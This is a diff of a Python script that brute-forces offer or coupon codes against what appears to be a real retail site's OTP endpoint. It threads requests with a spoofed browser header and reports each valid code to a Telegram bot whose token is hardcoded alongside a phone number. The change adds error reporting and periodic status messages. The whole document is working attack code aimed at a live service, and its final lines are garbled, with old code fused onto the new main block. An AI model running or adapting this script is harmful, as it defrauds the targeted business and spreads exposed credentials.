@@ -7,6 +7,7 @@ import json
 import requests
 from concurrent.futures import ThreadPoolExecutor
 from http.server import HTTPServer, BaseHTTPRequestHandler
+from collections import defaultdict
 
 # ================== CONFIGURATION ==================
 BASE_URL = "https://www.ossw.theofferclub.in"
@@ -16,13 +17,17 @@ TEST_MOBILE = "9038529139"
 NUM_CODES = 100000
 MAX_WORKERS = 5
 DELAY_PER_THREAD = 2.0
+STATUS_INTERVAL = 100          # send status update every 100 checks
 
 TELEGRAM_TOKEN = "8789555036:AAGw-EovbhVHoI81lD6QJ9AeFhn4eJNnFaY"
 TELEGRAM_CHAT_ID = "5177144784"
 
 print_lock = threading.Lock()
 code_counter = 0
-last_status_time = time.time()
+valid_counter = 0
+last_status_sent = 0
+last_error_sent = 0
+error_counts = defaultdict(int)
 
 # ================== TELEGRAM ==================
 def send_telegram_message(text):
@@ -30,7 +35,18 @@ def send_telegram_message(text):
     try:
         requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text}, timeout=5)
     except Exception as e:
-        print(f"Telegram error: {e}")
+        print(f"Telegram send failed: {e}")
+
+def send_error_report(error_type, details):
+    global last_error_sent
+    now = time.time()
+    # Throttle errors: send at most one error per minute per type
+    if now - last_error_sent < 60:
+        return
+    last_error_sent = now
+    error_counts[error_type] += 1
+    msg = f"⚠️ ERROR [{error_type}]: {details}\nTotal {error_type} errors: {error_counts[error_type]}"
+    send_telegram_message(msg)
 
 # ================== CODE GENERATION ==================
 def generate_random_code():
@@ -38,7 +54,7 @@ def generate_random_code():
     chars = string.ascii_uppercase + string.digits
     return prefix + ''.join(random.choices(chars, k=6))
 
-# ================== CODE CHECKER WITH FULL DEBUG ==================
+# ================== CODE CHECKER WITH ERROR CAPTURE ==================
 def check_code(code):
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
@@ -47,68 +63,90 @@ def check_code(code):
     data = {"phone": TEST_MOBILE, "ccode": code}
     try:
         r = requests.post(OTP_ENDPOINT, data=data, headers=headers, timeout=15)
-        if r.status_code == 200:
-            try:
-                json_resp = r.json()
-                # Log full response for first few codes to see format
-                if code_counter < 5:
-                    with print_lock:
-                        print(f"DEBUG Response for {code}: {json.dumps(json_resp, indent=2)}")
-                return json_resp.get("status") == "success"
-            except:
-                with print_lock:
-                    print(f"DEBUG Non-JSON response for {code}: {r.text[:200]}")
-                return False
-        else:
-            with print_lock:
-                print(f"DEBUG HTTP {r.status_code} for {code}")
+        if r.status_code != 200:
+            send_error_report("HTTP", f"Status {r.status_code} for {code}")
             return False
+        try:
+            json_resp = r.json()
+            status = json_resp.get("status")
+            if status == "success":
+                return True
+            elif status in ("failure", "code_failure"):
+                # Normal invalid – no error
+                return False
+            else:
+                send_error_report("UnknownStatus", f"Status '{status}' for {code}")
+                return False
+        except json.JSONDecodeError:
+            send_error_report("JSONParse", f"Invalid JSON: {r.text[:100]}")
+            return False
+    except requests.exceptions.Timeout:
+        send_error_report("Timeout", f"Request timeout for {code}")
+        return False
+    except requests.exceptions.ConnectionError:
+        send_error_report("ConnectionError", f"Cannot connect to {BASE_URL}")
+        return False
     except Exception as e:
-        with print_lock:
-            print(f"DEBUG Exception for {code}: {e}")
+        send_error_report("Generic", f"{type(e).__name__}: {str(e)[:100]}")
         return False
 
 # ================== PROCESS CODE ==================
 def process_code(code):
-    global code_counter, last_status_time
-    valid = check_code(code)
+    global code_counter, valid_counter, last_status_sent
+    is_valid = check_code(code)
     with print_lock:
         code_counter += 1
-        symbol = "✅" if valid else "❌"
+        if is_valid:
+            valid_counter += 1
+            symbol = "✅"
+            # Send valid code immediately
+            msg = f"🎉 VALID CODE!\n🔑 {code}\n📱 {TEST_MOBILE}\n⏰ {time.ctime()}"
+            send_telegram_message(msg)
+            with open("valid_codes.txt", "a") as f:
+                f.write(f"{code} | {TEST_MOBILE} | {time.ctime()}\n")
+        else:
+            symbol = "❌"
         print(f"{symbol} {code}")
-        
-        # Send status update every 1000 codes
-        now = time.time()
-        if now - last_status_time >= 60:  # every minute
-            last_status_time = now
-            send_telegram_message(f"📊 Status: checked {code_counter} codes, valid found: {valid_count_temp}")
-    
-    if valid:
-        msg = f"🎉 VALID CODE!\n🔑 {code}\n📱 {TEST_MOBILE}\n⏰ {time.ctime()}"
-        send_telegram_message(msg)
-        with open("valid_codes.txt", "a") as f:
-            f.write(f"{code} | {TEST_MOBILE} | {time.ctime()}\n")
+
+        # Send periodic status update every STATUS_INTERVAL codes
+        if code_counter % STATUS_INTERVAL == 0:
+            status_msg = f"📊 Status: {code_counter} codes checked, {valid_counter} valid found."
+            send_telegram_message(status_msg)
+            last_status_sent = time.time()
     
     time.sleep(DELAY_PER_THREAD)
-    return valid
 
 # ================== VALIDATOR LOOP ==================
 def run_validator():
-    global code_counter
-    send_telegram_message("🚀 Validator started with FULL DEBUG logging")
+    send_telegram_message("🚀 Validator started with periodic updates (every 100 codes) and error reporting.")
     send_telegram_message(f"🎯 Target mobile: {TEST_MOBILE}")
-    print("Validator running. Checking codes with debug output...")
+    print("Validator running. Updates will be sent every 100 codes.")
     while True:
         codes = [generate_random_code() for _ in range(NUM_CODES)]
         with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
             executor.map(process_code, codes)
-        print(f"Batch done. Total checked: {code_counter}")
+        print(f"Batch done. Total checked: {code_counter}, valid: {valid_counter}")
         time.sleep(5)
 
 # ================== HTTP KEEP-ALIVE ==================
 class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"Validator running - with error reporting")
+    def log_message(self, format, *args):
+        pass
+
+def start_http_server():
+    port = int(os.environ.get("PORT", 5000))
+    server = HTTPServer(('0.0.0.0', port), Handler)
+    print(f"HTTP keep-alive server on port {port}")
+    server.serve_forever()
+
+# ================== MAIN ==================
+if __name__ == "__main__":
+    threading.Thread(target=run_validator, daemon=True).start()
+    start_http_server()        self.send_response(200)
         self.end_headers()
         self.wfile.write(b"Validator running - debug mode")
     def log_message(self, format, *args):
